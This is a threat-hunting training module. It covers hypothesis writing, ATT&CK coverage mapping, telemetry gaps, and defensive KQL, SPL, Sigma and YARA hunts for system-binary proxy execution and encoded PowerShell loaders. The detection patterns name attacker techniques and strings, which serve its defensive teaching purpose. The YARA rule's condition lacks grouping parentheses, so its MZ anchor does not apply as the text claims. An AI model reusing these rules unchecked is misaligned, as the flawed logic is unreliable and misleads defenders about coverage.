---
id: advance-02-threat-hunting
track: advance
phase: 2
order: 20
title: "Phase 2 — Threat Hunting"
duration: "5 weeks"
duration_weeks: 5
energy_mix: [low, normal]
deliverable: "portfolio/advance/02-threat-hunting.md"
exit_criteria: "You can plan and run a hypothesis-driven hunt, record what you found and did not find, and turn the result into either a durable detection or a documented telemetry gap with an owner."
---

# Phase 2 — Threat Hunting

## Goal of this phase

Learn to go looking for activity nobody wrote a rule for: state a hypothesis, work out whether your telemetry can even answer it, run the hunt, and turn the result — including a result that found nothing — into either a durable detection or a written telemetry gap with a name against it.

## Estimated time

**5 weeks** at about 8–11 focused hours a week. Roughly 40–55 hours, and the write-up is a real part of it.

## Skills you'll gain

- Tell the difference between monitoring, triage, and hunting, and explain why the distinction changes what you do.
- Write a hunt hypothesis that is specific enough to be falsified and broad enough to be worth a week.
- Generate hypotheses from MITRE ATT&CK technique families rather than from whatever query you already have.
- Assess whether your available telemetry can answer a given hypothesis, and say so honestly when it cannot.
- Write working hunting queries in KQL, SPL, and Sigma, and convert between the shapes.
- Write a YARA rule that matches a behaviour rather than a single hash.
- Run a hunt end to end: scope, data check, query, triage of results, conclusion, write-up.
- Turn a confirmed finding into a durable detection that runs after you stop looking.
- Document a hunt that found nothing so that it reads as a result, not as wasted time.
- State the cost of a hunt in analyst hours and defend the spend.

## Specific topics to learn

- Hunting versus monitoring versus triage: what each one optimises for
- The hypothesis as the unit of work, and what makes one falsifiable
- Structured hypothesis forms: situation, hypothesis, data, analysis, conclusion
- MITRE ATT&CK tactic and technique families as a hypothesis generator
- The Pyramid of Pain: hashes, IP addresses, domains, artefacts, tools, TTPs, and what each costs an adversary to change
- Data-source inventory: what you actually collect, at what fidelity, for how long
- Telemetry fidelity versus volume: full command lines, process lineage, script-block logging, DNS, proxy, authentication
- Gap analysis: naming the technique you cannot see and the data that would be required
- Query languages: KQL for Microsoft Sentinel and Defender XDR, SPL for Splunk, Sigma as a vendor-neutral format
- Translating one hypothesis across query languages
- YARA for file and memory pattern hunting
- Endpoint hunting with Velociraptor VQL and osquery SQL
- Baselining and rarity: what is unusual for this estate, not for the world
- Stack counting, long-tail analysis, and frequency analysis
- Clustering hunt results to make a large result set reviewable
- The hunt document: a template with fixed fields
- From finding to detection: rule logic, tuning, false-positive rate, and ownership
- Hunt metrics: what to measure, and what measuring hunts badly does to a team
- Reporting a null result without it reading as failure

## Lesson: A Hunt That Finds Nothing Is Still a Result

### Why this lesson exists

Everything you have been trained to do so far ends in a ticket. An alert fires, you triage it, you close it or escalate it, and the queue moves on. That loop has a property you may not have noticed: **it only ever looks at things somebody already thought to ask about.**

Every alert in your queue exists because a person, at some point, sat down and wrote a rule that describes a behaviour they expected to see. If an adversary does something nobody wrote a rule for, the queue will never mention it.

Threat hunting is the work of closing that gap deliberately, before an incident forces you to. It is the one security activity whose entire purpose is to look somewhere no rule is pointing.

That also makes it the easiest security activity to do badly, because it has no queue to discipline you. Nobody hands you a hunt. Nobody complains if you skip it. And the most common outcome is that you spend three days and find nothing — which, to an untrained eye, looks exactly like spending three days doing nothing at all.

**This lesson exists to give you two things.** The first is a method: a way of turning a vague worry into a hypothesis specific enough that a query can answer it, and then turning the answer into something permanent. The second is the language to explain a hunt that found nothing to a manager who is paying for the hours, without either overstating what you did or apologising for it.

That second thing is the one that decides whether hunting survives in your organisation. A team that can only justify hunts that produce an incident will be told, after the first quiet quarter, that hunting is a luxury. A team that can show a coverage map, a set of new detections, and a list of telemetry gaps closed will keep the budget. **The write-up is not the paperwork after the hunt. It is the product.**

#### What the exit criterion actually demands

Read it again closely.

> You can plan and run a hypothesis-driven hunt, record what you found and did not find, and turn the result into either a durable detection or a documented telemetry gap with an owner.

It names four capabilities, and they are ordered from least to most durable.

| Requirement | The skill underneath it |
|---|---|
| **Plan a hypothesis-driven hunt** | You can state what you expect to see, and why, before you query anything |
| **Run it** | You can write and execute the queries, and triage what comes back |
| **Record what you found and did not find** | You write negative results down as findings, not as omissions |
| **Turn the result into a durable detection or a documented gap with an owner** | The hunt outlives you — someone else inherits a rule or a ticket |

That last row is the whole phase. A hunt that ends in a personal insight ends when you change jobs.

#### Time to complete

**Roughly 41–58 hours over 5 weeks:**

| Work | Hours | Notes |
|---|---|---|
| Reading this lesson | 3–4 | Once, properly |
| Building the data-source inventory | 6–9 | Slow, unglamorous, and the most useful thing here |
| Two small hunts (a day each) | 10–14 | One should be deliberately aimed at a data gap |
| One full hunt, start to finish | 12–16 | This is the portfolio artefact |
| Converting a finding into a detection | 4–6 | Query, test, tune, document |
| The hunt write-ups | 6–9 | Both the hit and the miss |

Note where the hours are. Reading this lesson is four hours. Writing the output is closer to thirty. That ratio is not padding — at this level the document is the work product, and a hunt nobody can read is a hunt that did not happen.

#### What this phase is not

It is not a phase about buying a threat-intelligence feed. Every hunt in this phase can be built from telemetry you already have, plus free public knowledge of how attackers behave.

It is not a phase about finding malware samples and reverse-engineering them. That is a different specialism, and the hunts here stop at behaviour.

And it is not a promise that you will find something. **A hunting programme that finds something every week is either hunting somewhere a rule already covers, or mislabelling triage as hunting.**

### Part 1 — Hunting, monitoring, and triage are three different jobs

#### The distinction that changes what you do

These three activities feel similar because they all involve looking at logs. They optimise for different things, and confusing them produces a hunting programme that is really just a slower queue.

| | Monitoring | Triage | Hunting |
|---|---|---|---|
| **Trigger** | A rule fires | An alert lands in your queue | A question you decided to ask |
| **Question** | Is this rule working? | Is this alert real, and how bad? | Is this behaviour present here at all? |
| **Success** | The pipeline stays up and coverage holds | The alert reaches the right disposition | You learn something true and act on it |
| **Failure mode** | Silent data loss | An alert closed without a reason | A week spent on a query that could never have answered the question |
| **Time horizon** | Continuous | Minutes to hours | Days |
| **Output** | A functioning detection estate | A closed ticket | A detection, a gap, or a documented negative |

Read the failure modes column. **Monitoring fails by going blind**, and you cannot tell it has gone blind by looking at the queue, because an empty queue and a broken pipeline look identical from the outside. That is a recurring theme here: **the absence of a signal is not evidence of the absence of activity**, and telling those two apart is a skill this phase teaches directly.

**Triage fails by making a decision without a reason.** "Closed as false positive" with no explanation is not a disposition, it is a shrug, and it destroys the information the alert contained.

**Hunting fails by asking a question the data cannot answer** — and then, rather than noticing, reporting the empty result as if it were a negative finding. That mistake is so common and so damaging that Part 4 is devoted to it.

#### The queue makes you reactive, and that is not a criticism

There is nothing wrong with triage. It is the job, it is necessary, and a good analyst is fast at it. The problem is structural: the queue is somebody else's list of questions, written in the past, and it will always lag behind an adversary who changes behaviour.

A rule is a statement about the past. It says: *when I wrote this, attackers were doing X, and I want to know next time it happens.* That statement is only as good as the imagination of the person who wrote it. Every adversary who reads a public detection write-up and changes tooling has invalidated a set of rules, and nobody in the SOC finds out until an incident review.

Hunting is the mechanism by which an organisation checks its own assumptions without waiting for that review.

#### The awkward consequence

Here is the uncomfortable arithmetic. If a hunt's success is measured by whether it found an intrusion, then the hunts that found nothing — which should be most of them — look like failures. A team optimising for that metric will drift toward hunts that reliably produce something, which means hunting for behaviours that already have alerts, which means doing triage with a different label.

| If you measure hunts by… | The team will… |
|---|---|
| Number of incidents found | Hunt where incidents are already known, and stop hunting anywhere else |
| Alerts generated | Write a noisy query once and re-run it forever |
| Hypotheses retired and coverage changed | Hunt properly, and report negatives as results |
| Telemetry gaps closed | Hunt the edges of what they can see, and document what they cannot |

The fourth row is the one that actually improves an organisation, and it is the metric this phase is built around. **A hunt's durable output is a change to the estate: a new rule, a retired hypothesis, or a closed data gap.**

#### Where the hypothesis comes from

If hunting is asking a question, the whole discipline reduces to: *how do you get a good question?* There are four honest sources, and a mature programme uses all four.

| Source | What it gives you | Its weakness |
|---|---|---|
| **Threat intelligence** | What a specific actor targeting your sector is known to do | Feeds lag; you hunt last quarter's behaviour |
| **MITRE ATT&CK** | A structured list of behaviours, independent of any actor | Broad; needs narrowing to what your estate can show |
| **Your own incidents** | Behaviour you have already seen once, and may see again | Backward-looking by construction |
| **Anomaly and rarity** | What is unusual here, regardless of whether it is known-bad | Noisy; needs a baseline and judgement |

**The third source is the most under-used and the cheapest.** Every incident your team has closed in the last year contains a behaviour somebody detected by luck, or by a user reporting it. Turn each of those into a hypothesis and run it against the previous ninety days. You will often find that the same behaviour was present before, at low volume, on hosts nobody looked at.

**The fourth source is the one that scales worst but surprises most.** A hunt for "processes that are rare in this estate" requires no threat intelligence at all, only a baseline. Part 5 covers how to build one without drowning.

### Part 2 — Writing a hypothesis that is worth a week

#### What makes a hypothesis falsifiable

A hypothesis is falsifiable when you can describe, in advance, what evidence would prove it wrong. That sounds like philosophy and it is actually a budgeting rule: **if nothing could disprove your hypothesis, no query can answer it, and you should not spend a week on it.**

Compare these four statements. Only one is a hunt.

| Statement | Why it works or fails |
|---|---|
| "We should look for lateral movement" | Not a hypothesis. No behaviour, no data source, no way to be wrong |
| "Attackers use PsExec to move laterally" | True, and still not a hypothesis — it is a fact about attackers, not a claim about your estate |
| "If an adversary used PsExec-style remote service creation against our Windows estate in the last 90 days, we would see service installation events (System 7045) on a target host with a corresponding authentication (Security 4624 type 3) from a workstation in the previous 60 seconds." | A hypothesis. Names behaviour, data sources, and a join — and could be false |
| "There is no PsExec lateral movement in our estate" | A claim, not a hypothesis. It cannot be tested, only assumed |

The third row has five properties worth naming, because they are the checklist for every hypothesis you write.

| Property | In the example | Why it matters |
|---|---|---|
| **A behaviour, not an artefact** | Remote service creation followed by authentication | Artefacts (a filename, an IP) are cheap for an adversary to change |
| **A named data source** | System 7045, Security 4624 | If you do not know the source, you cannot know whether you collect it |
| **A time window** | 90 days | Forces you to check retention *before* you start |
| **A scope** | Windows hosts in the estate | Prevents an unbounded query |
| **A falsifiable shape** | The join either produces rows or does not | You can state a conclusion either way |

#### The structured form you actually write down

Use this and fill it in before you open a query editor. The blank fields are the point — they force the data check before the query.

```text
HUNT PLAN — HUNT-2026-014

Hunt ID          HUNT-2026-014
Author           Your Name
Opened           2026-04-06
Time box         3 working days, 12 analyst hours

Situation        Two hosts in the last quarter showed unexpected outbound
                 connections to hosting-provider address space. Neither was
                 explained, and neither had a rule that would have caught it.
                 The activity was found during an unrelated rebuild.

Hypothesis       If an adversary established persistence through remote
                 service creation on our Windows estate in the last 90 days,
                 we will see System event 7045 on the target host, with a
                 Security 4624 type 3 logon from the source host within the
                 preceding 60 seconds, where the source host is not a
                 management server.

ATT&CK mapping   T1021.002 — Remote Services: SMB/Windows Admin Shares
                 T1569.002 — System Services: Service Execution
                 T1543.003 — Create or Modify System Process: Windows Service

Data required    Windows System log, event 7045
                 Windows Security log, event 4624 (type 3)
                 Host role inventory (which hosts are management servers)
                 Process creation with command lines on the source host

Retention check  System log: 180 days in the SIEM. OK.
                 Security 4624: 90 days in the SIEM. OK, at the boundary.
                 Process creation: 30 days. INSUFFICIENT for the full window.

Expectation      Fewer than 50 results. If the query returns thousands, the
                 scope is wrong and the hunt must be re-scoped, not widened.

Disconfirming    A result set of zero, or results entirely explained by the
evidence         deployment tooling listed in the exclusion set.

Owner            You
```

Two lines in that template do most of the work.

**The retention check.** If your Security log retention is 90 days and your hypothesis covers 90 days, you are hunting the exact boundary of your data. That is not automatically wrong, but you must *know* it, because a negative result now means something different: "no evidence found in the 90 days we retain", not "no evidence found in 90 days". The report has to say which.

**The expectation.** Writing down how many results you expect turns a suspiciously large result set into a signal rather than a chore. A query returning 40,000 rows is not a rich hunt; it is a badly scoped one.

#### The common failure: the tool-first hunt

Here is the mistake to name and avoid, because it is the single most common way a hunting programme turns into theatre.

**The tool-first hunt starts with a query and looks for a reason to run it.**

It looks like this. An analyst reads a blog post containing a KQL query for a Cobalt Strike beacon pattern. They open the query editor, paste it, change nothing except the time range, run it, get zero rows, and write "Hunted for Cobalt Strike — nothing found."

The entry goes in the log. Nothing about the estate has changed. No hypothesis was stated, no data source was checked, no conclusion was possible, and the zero rows mean almost nothing because nobody established that the data would have shown the activity if it were there.

| Tool-first hunt | Hypothesis-first hunt |
|---|---|
| Starts with a query someone else wrote | Starts with a claim about your estate |
| Ends with "nothing found" | Ends with a conclusion, a confidence, and a gap |
| Cannot be reviewed, because there is no stated expectation | Reviewable — the plan states what would disprove it |
| Reproducible only by re-running the same query | Reproducible by anyone who reads the plan |
| Produces a log entry | Produces a detection, a gap, or a retired hypothesis |

**The test that separates them:** can you state, in one sentence, what you expected to see and why? If the honest answer is "I wanted to run this query because it looked interesting", you are doing tool-first hunting, and the result will not survive a review.

There is a legitimate version of this, and it is worth naming so you do not overcorrect. Reading a public detection write-up and asking "could that happen here, and would we see it?" is a perfectly good source of hypotheses. The difference is that you then write the hypothesis down, check the data, and run it against your estate — rather than pasting the query and calling the empty output a finding.

#### Scoping so the hunt is finishable

A hunt that cannot finish teaches nothing. Three scoping controls keep it bounded.

| Control | What it does | Example |
|---|---|---|
| **Time box** | Limits the calendar and the hours, and is written down in advance | "Three working days, 12 analyst hours" |
| **Scope** | Limits the population | "Servers only", "the finance subnet", "hosts with the EDR agent reporting" |
| **Expectation** | Limits the result set | "Fewer than 50 rows, or the scope is wrong" |

**Write the time box down before you start, and honour it.** A hunt that runs for three weeks is not a hunt, it is an unowned project, and it will be abandoned half-documented. When the box expires, you write up whatever you have — including "inconclusive, data was insufficient" — and close it. That closing is a real result.

### Part 3 — ATT&CK as a hypothesis generator

#### Why a framework rather than a list of threats

MITRE ATT&CK is a catalogue of adversary behaviours, organised by tactic — the goal the adversary is pursuing — and technique — the means they use. Its value to a hunter is not that it lists threats. It is that it gives you a **finite, structured set of behaviours to be systematically ignorant about**.

Without a framework, hunting is a random walk: you hunt what you happened to read about last week. With a framework, you can ask a much better question: *across these fourteen tactics, which techniques could we even see, and which have no rule and no recent hunt?* The answer to that is a work queue.

| Tactic | The question it asks about your estate |
|---|---|
| Reconnaissance | Would we notice someone enumerating us from outside? |
| Resource Development | Would we notice infrastructure being stood up to target us? |
| Initial Access | Would we notice a foothold appearing? |
| Execution | Would we notice code running that should not? |
| Persistence | Would we notice something surviving a reboot that should not? |
| Privilege Escalation | Would we notice a user gaining rights they did not have? |
| Defense Evasion | Would we notice our own tooling being turned off or blinded? |
| Credential Access | Would we notice credentials being read in bulk? |
| Discovery | Would we notice someone mapping the estate? |
| Lateral Movement | Would we notice a host talking to hosts it never talks to? |
| Collection | Would we notice bulk access to files a role does not need? |
| Command and Control | Would we notice regular, low-volume outbound traffic? |
| Exfiltration | Would we notice data leaving by any route? |
| Impact | Would we notice destructive activity early enough to matter? |

**Read that column as a set of gaps rather than a set of capabilities.** Most estates answer "probably not" to at least four of those, and the honest four are the hunt queue.

#### Building the technique shortlist

Do not try to hunt a tactic. Hunt a technique family you can actually observe.

| Step | What you do |
|---|---|
| 1 | Pick two or three tactics where your detection coverage is thin |
| 2 | List the techniques under them, from ATT&CK |
| 3 | Mark each technique: **covered** by a rule, **visible** in telemetry but not alerted, or **blind** — no data source |
| 4 | Take the "visible but not alerted" techniques first — they are the cheapest wins |
| 5 | Take the "blind" techniques next, and turn each into a telemetry request rather than a hunt |
| 6 | Write one hypothesis per technique, in the Part 2 form |

**Step 4 is the fastest way to find something real.** A technique that is visible in telemetry but has no rule is a technique you are collecting evidence for and not acting on. That is wasted spend, and hunting it costs a query rather than a project.

**Step 5 is the step that produces the most durable value and the least excitement.** A blind technique cannot be hunted. Saying so in writing, with the specific data source that would fix it and a named owner, converts a hunt into a funded request. That is the entire point of the exit criterion's second half.

#### A coverage table you can actually build in a week

You do not need a mature ATT&CK assessment. You need a table with four columns.

| Technique | Data source in our estate | Rule exists? | Last hunted? |
|---|---|---|---|
| T1053.005 Scheduled Task | Security 4698, Sysmon 1/11 | Yes — DET-118 | Never |
| T1059.001 PowerShell | Script block logging, EDR process events | Yes — DET-042 | 2025-11 |
| T1218.011 Rundll32 | EDR process events, command lines | No | Never |
| T1071.001 Web protocols | Proxy, DNS, firewall | Partly — proxy only | 2025-09 |
| T1021.002 SMB/Admin shares | Security 4624 type 3, 5140 | No | Never |
| T1562.001 Impair defenses | EDR tamper events, service state | No | Never |
| T1055 Process injection | EDR memory events | No | Never |
| T1098 Account manipulation | Cloud audit log, directory audit | Partly — one rule | Never |

Four of those eight rows have a rule and no hunt. Three have neither. One has a partial. **That table is the work queue for a year, and it took an afternoon to produce.** Notice how many rows say "Never" — most estates look like this, and the reason is not laziness. It is that nobody owned the list.

#### Mapping a technique to what you can actually query

The gap between "T1053.005 is visible in Security 4698" and "I can hunt T1053.005" is a field-level question. For each technique, write down the fields your query will need.

| Technique | Fields the hunt needs | Do we have them? |
|---|---|---|
| T1053.005 Scheduled Task | Task name, task action (the binary and arguments), creating account, host, time | Task name yes, action **no** — 4698 TaskContent is not being parsed |
| T1059.001 PowerShell | Full command line, script block text, parent process, user | Command line yes; script block text yes, 30-day retention only |
| T1218.011 Rundll32 | Full command line, DLL path argument, parent process | Yes |
| T1071.001 Web protocols | Remote host, URL, initiating process, bytes out | URL and process yes; bytes **no** — proxy logs lack byte counts |

**The "Do we have them?" column is where hunts are actually saved or killed.** The first row shows a hunt that cannot run properly today: the event exists but the field you need is not parsed. That is a two-hour parser change, and it unblocks an entire technique family. Finding it in ten minutes of planning is far better than discovering it two days into the hunt.

### Part 4 — Data sources, fidelity, and knowing when you cannot answer the question

#### The honest question: can my data even show this?

Before any query, ask four questions about the data the hypothesis needs.

| Question | Why it decides the hunt |
|---|---|
| **Is it collected at all?** | A technique with no data source cannot be hunted, only requested |
| **At what fidelity?** | A process event without a command line cannot distinguish `rundll32` from `rundll32 evil.dll` |
| **For how long?** | Retention shorter than your window makes a negative result ambiguous |
| **Can it be joined to what I need?** | A hostname in one log and a device ID in another may make the join impossible |

The fourth question is the one people forget. Two logs can both exist, both be complete, and still be unjoinable because they do not share a key with enough precision. If the authentication log has a username and the process log has a device ID and nothing maps them, you cannot answer a question that needs both.

#### Fidelity: the difference between presence and evidence

Fidelity is how much of the original event survives into your store. Low fidelity gives you the fact; high fidelity gives you the reason.

| Source | Low-fidelity version | High-fidelity version | What the extra buys you |
|---|---|---|---|
| Process creation | Process name only | Name, path, full command line, parent, user, hash | Distinguishes the tool from the behaviour |
| PowerShell | Module logging (which commands) | Script block logging (the actual code) | You see obfuscated scripts after deobfuscation |
| DNS | Query count | Query name, response, client, process | You can attribute the query to a process |
| Proxy | Destination and bytes | Full URL, method, user agent, initiating process | You can separate download from beacon |
| Cloud audit | Action taken | Actor, IP, user agent, target resource, before/after | You can distinguish a console session from an API call |

**The rule of thumb: a hunt is only as sharp as its least detailed field.** If your process log has no command line, every hunt that depends on arguments is unavailable to you, however good the rest of the data is.

#### Writing the gap down as a result

When the data cannot answer the question, that is a finding — provided it is written as one. Compare the two entries.

| Weak entry | Strong entry |
|---|---|
| "Could not hunt scheduled tasks properly, no data." | "Hunt HUNT-2026-014 could not be completed for T1053.005. Security 4698 is collected with a 180-day retention, but the TaskContent field is not parsed by the current connector, so task actions cannot be filtered. Effect: no hunt can distinguish a task running a signed updater from a task running an encoded script interpreter. Fix: parse TaskContent in the connector (2 hours, ingest team). Owner: ingest team lead, ticket ING-4471, target 2026-04-20. Interim: hunt on task *names* only, which is possible but weak." |

The second entry names the technique, the retention, the missing field, the effect, the fix, the cost, the owner, the ticket, and the interim mitigation. **It is more valuable than a hunt that found a low-severity oddity**, because it unblocks an entire technique family permanently.

#### The data-source inventory, and why it takes a week

Build this before you hunt. It is the reference that makes every future hunt's planning step take ten minutes instead of two days.

```text
DATA SOURCE INVENTORY — extract, not hand-written

Source            Table / index          Key fields                       Retention   Fidelity
----------------  ---------------------  -------------------------------  ----------  --------
Windows Security  SecurityEvent          4624 logon, 4688 process,        90 days     Full
                                         4698 task, 5140 share
Sysmon            Sysmon/Operational     1 process, 3 network, 11 file,   180 days    Full
                                         13 registry
PowerShell        PowerShell/Operational 4104 script block                30 days     Full
EDR process       DeviceProcessEvents    cmdline, parent, hash, user      30 days     Full
EDR network       DeviceNetworkEvents    remote IP/port, process          30 days     IP only
Proxy             proxy_access           URL, user, bytes, method         30 days     Full
DNS               dns_queries            query, client, response          14 days     Full
Cloud audit       AuditLogs              actor, IP, action, resource      180 days    Full
Identity          SigninLogs             user, IP, result, MFA detail     90 days     Full
```

Two rows in a table like this usually surprise people.

**DNS at 14 days.** DNS is the cheapest, most complete source of beacon detection in most estates, and it is very often the shortest-retention log because it is high-volume and nobody thought of it as evidence. If your DNS retention is 14 days, you are hunting a two-week estate.

**EDR network with IP only.** No URL, no bytes out. That means you can detect a connection to an address you already distrust, and you cannot detect a slow beacon to an address you have never seen — which is the hunt that matters.

```text
The retention question, asked once per source:

  For each source, ask: what is the longest window in which I could
  still ask "did this happen here?" and get a trustworthy answer?

  That number is your estate's investigative memory. Everything older
  is, for practical purposes, gone — and a negative result from before
  that boundary is meaningless rather than reassuring.
```

### Part 5 — The queries: KQL, SPL, Sigma, YARA

#### One hypothesis, four languages

Take a single concrete hypothesis and express it in the formats you will actually meet.

**Hypothesis.** *If an adversary is using a signed Windows system binary to proxy execution of script content from a user-writable directory, we will see `rundll32.exe`, `regsvr32.exe`, or `mshta.exe` launched with an argument pointing into `AppData`, `Temp`, `Downloads`, or `ProgramData`.*

This maps to ATT&CK **T1218 — System Binary Proxy Execution** and its sub-techniques T1218.011 (Rundll32), T1218.010 (Regsvr32), and T1218.005 (Mshta).

#### KQL — Microsoft Sentinel and Defender XDR

```kql
// Hunt HUNT-2026-021 — T1218 System Binary Proxy Execution
// Defender XDR advanced hunting. DeviceProcessEvents holds endpoint
// process creation with full command lines and process lineage.

let lookback = 30d;
let proxies = dynamic(["rundll32.exe", "regsvr32.exe", "mshta.exe", "installutil.exe"]);
DeviceProcessEvents
| where Timestamp > ago(lookback)
| where FileName in~ (proxies)
| where ProcessCommandLine has_any (@"\AppData\", @"\Temp\", @"\Downloads\", @"\ProgramData\", @"\Users\Public\")
| project Timestamp,
          DeviceName,
          AccountName,
          FileName,
          ProcessCommandLine,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine,
          InitiatingProcessParentFileName,
          SHA256
| sort by Timestamp desc
```

Four details make that query correct and reviewable.

**`in~`** is the case-insensitive membership operator; `in` would miss `RUNDLL32.EXE`. On Windows filenames, always use the case-insensitive form.

**`has_any`** is a term-level match that respects word boundaries and is much faster than `contains`. For path fragments with backslashes, the verbatim string literal `@"...\"` avoids escaping confusion.

**`InitiatingProcessParentFileName`** is what turns a list of hits into a story. A `rundll32.exe` launched by `explorer.exe` after a user double-clicked a file is a different situation from one launched by `winword.exe` from a document.

**`SHA256`** is included so that a triaged hit can be pivoted on immediately, without a second query.

Now the same hypothesis joined to network evidence, which is where a hit becomes an incident:

```kql
// HUNT-2026-021, stage 2 — did any of those proxy executions talk out?
let lookback = 30d;
let proxies = dynamic(["rundll32.exe", "regsvr32.exe", "mshta.exe"]);
let suspicious =
    DeviceProcessEvents
    | where Timestamp > ago(lookback)
    | where FileName in~ (proxies)
    | where ProcessCommandLine has_any (@"\AppData\", @"\Temp\", @"\Downloads\", @"\ProgramData\")
    | project DeviceId, DeviceName, ProcessId = tostring(ProcessId), Timestamp;
suspicious
| join kind=inner (
    DeviceNetworkEvents
    | where Timestamp > ago(lookback)
    | where ActionType == "ConnectionSuccess"
    | project DeviceId,
              NetworkTime = Timestamp,
              RemoteIP,
              RemotePort,
              InitiatingProcessId = tostring(InitiatingProcessId)
) on DeviceId, $left.ProcessId == $right.InitiatingProcessId
| where NetworkTime between (Timestamp .. (Timestamp + 10m))
| project DeviceName, Timestamp, ProcessId, NetworkTime, RemoteIP, RemotePort
| sort by Timestamp desc
```

**The time bound is the part beginners leave out.** Joining on process ID alone across a 30-day window will match a process ID that was reused by an unrelated process days later. `between (Timestamp .. (Timestamp + 10m))` constrains the join to a plausible causal gap. **Process IDs are recycled, and a join without a time bound is a false-positive generator.**

#### SPL — Splunk

The same hypothesis, against Sysmon event code 1, which is the process creation record most Splunk estates index.

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| eval ImageLower = lower(Image)
| where ImageLower IN ("*\\rundll32.exe", "*\\regsvr32.exe", "*\\mshta.exe", "*\\installutil.exe")
| where match(CommandLine, "(?i)(\\\\AppData\\\\|\\\\Temp\\\\|\\\\Downloads\\\\|\\\\ProgramData\\\\|\\\\Users\\\\Public\\\\)")
| table _time, ComputerName, User, Image, CommandLine, ParentImage, ParentCommandLine
| sort - _time
```

Then a rarity pass on the same data, which is how SPL earns its place: the `rare` command finds the long tail without you writing a threshold.

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| eval Parent = lower(ParentImage), Child = lower(Image)
| stats count by Parent, Child
| where count < 5
| sort count
| head 100
```

That second search is a hunt in its own right, and it is the cheapest one in this lesson. **It asks: which parent-child process pairs happen almost never in this estate?** Rare pairs include legitimate administration tools you forgot existed, and they include exactly the kind of unusual spawn an adversary produces. Run it monthly, and triage the top hundred.

A third, for a population-level question — which is where Splunk's `tstats` pays for itself:

```spl
| tstats count
    from datamodel=Endpoint.Processes
    where Processes.process_name=rundll32.exe
    by Processes.dest, Processes.user, Processes.process, _time span=1d
| where count > 0
| eventstats dc(Processes.dest) as host_count by Processes.process
| where host_count <= 2
| sort - _time
```

`eventstats` computes across the whole result set and adds the value back to each row, so `host_count` tells you how many distinct hosts ran that exact command line. A command line seen on one or two hosts across a month is a long-tail candidate; one seen on 400 hosts is your patching tool.

#### Sigma — the vendor-neutral form

Sigma is a rule format that describes detection logic independently of any vendor, so the same rule can be converted to Splunk, Sentinel, Elastic, or QRadar.

```yaml
title: System Binary Proxy Execution From User-Writable Directory
id: 4f2a9c31-7b6e-4d18-9c05-8e0a1d2f3b47
status: experimental
description: Detects rundll32, regsvr32 or mshta launched with an argument
  pointing into a user-writable directory, consistent with T1218 proxy execution.
references:
  - https://attack.mitre.org/techniques/T1218/
author: Your Name
date: 2026/04/06
tags:
  - attack.defense_evasion
  - attack.t1218.011
  - attack.t1218.010
  - attack.t1218.005
logsource:
  category: process_creation
  product: windows
detection:
  selection_image:
    Image|endswith:
      - '\rundll32.exe'
      - '\regsvr32.exe'
      - '\mshta.exe'
  selection_path:
    CommandLine|contains:
      - '\AppData\'
      - '\Temp\'
      - '\Downloads\'
      - '\ProgramData\'
      - '\Users\Public\'
  condition: selection_image and selection_path
falsepositives:
  - Software installers that register components from a per-user directory
  - Some collaboration tools that launch mshta for internal pages
level: medium
```

Three things to learn from the shape.

**`logsource` is the contract.** `category: process_creation` plus `product: windows` tells a converter which event source to bind to — Sysmon event 1, Windows Security 4688, or an EDR process event. Write it wrong and the conversion silently targets the wrong table.

**`condition` is where logic lives.** `selection_image and selection_path` requires both. Writing `1 of selection_*` instead would be true when only the image matches, which is every rundll32 on the estate.

**`falsepositives` is not an apology.** It is the documented tuning set, and it is what lets the next analyst know which results are expected without rediscovering them.

To convert a rule to a query language, the current tool is `sigma-cli` with a backend:

```bash
# Install the CLI and a Splunk backend, then convert.
pip install sigma-cli
sigma plugin install splunk

# Convert one rule to a Splunk search.
sigma convert -t splunk -p splunk_windows rules/windows/process_creation/proxy_execution_user_dir.yml

# Convert a whole directory to Microsoft Sentinel KQL.
sigma plugin install sentinel
sigma convert -t sentinel --without-pipeline rules/windows/process_creation/ > sentinel_queries.kql
```

The older `sigmac` script you will find in blog posts is deprecated. Use `sigma-cli`.

#### YARA — matching content rather than behaviour

Sigma and KQL describe what a system *did*. YARA describes what a file *is*, which makes it the right tool when you have a sample, a memory image, or a directory of files to sweep.

```yara
rule Hunt_Proxy_Loader_Encoded_Command
{
    meta:
        description = "Hunt rule for a small loader that decodes and executes a command"
        author = "Your Name"
        date = "2026-04-06"
        reference = "HUNT-2026-021"

    strings:
        $mz      = { 4D 5A }
        $a1      = "FromBase64String" ascii wide nocase
        $a2      = "Invoke-Expression" ascii wide nocase
        $a3      = "-EncodedCommand" ascii wide nocase
        $b1      = "rundll32" ascii wide nocase
        $b2      = "mshta" ascii wide nocase

    condition:
        $mz at 0 and filesize < 2MB and
        ( $a1 and $a2 ) or ( $a3 and 1 of ($b*) )
}
```

**`$mz at 0`** anchors the rule to an executable. Without it, the rule matches any document containing those strings, and you will drown in false positives from text files.

**`filesize < 2MB`** is a hunting economy. A loader that does this is small. The constraint removes large archives that happen to contain the strings and costs you almost nothing.

**The condition is deliberately loose.** A hunting YARA rule is a filter, not a verdict. It is meant to reduce a directory of 50,000 files to 30 worth opening by hand, not to be precise. If it is too tight you will miss the thing you were looking for, which is a worse failure in a hunt than a few false positives.

Scan a directory with a rule, and a memory image if you have one:

```bash
# Scan a folder recursively, listing matching rules per file.
yara -r hunt_proxy_loader.yar /evidence/files/

# Scan a memory image for the strings a process would have in memory.
yara -r hunt_proxy_loader.yar /evidence/memory.raw
```

#### Python and PowerShell — when a query is not enough

Some hunts need a loop, a set operation, or a baseline built in a way a query language makes awkward.

```python
#!/usr/bin/env python3
"""HUNT-2026-021 helper: find long-tail parent-child process pairs.

Reads a CSV exported from the SIEM with columns:
    host,user,parent_image,child_image,command_line,time
and reports process pairs that are rare across the estate.
"""
import csv
import sys
from collections import Counter, defaultdict

RARE_THRESHOLD = 3
pairs = Counter()
examples = defaultdict(list)

with open(sys.argv[1], newline="", encoding="utf-8") as handle:
    for row in csv.DictReader(handle):
        parent = row["parent_image"].lower()
        child = row["child_image"].lower()
        key = (parent, child)
        pairs[key] += 1
        if len(examples[key]) < 3:
            examples[key].append(
                f'{row["time"]} {row["host"]} {row["user"]} :: {row["command_line"]}'
            )

print(f"{len(pairs)} distinct parent-child pairs observed\n")
for (parent, child), count in pairs.most_common():
    if count > RARE_THRESHOLD:
        continue
    print(f"[{count:>3}] {parent}  ->  {child}")
    for line in examples[(parent, child)]:
        print(f"        {line}")
```

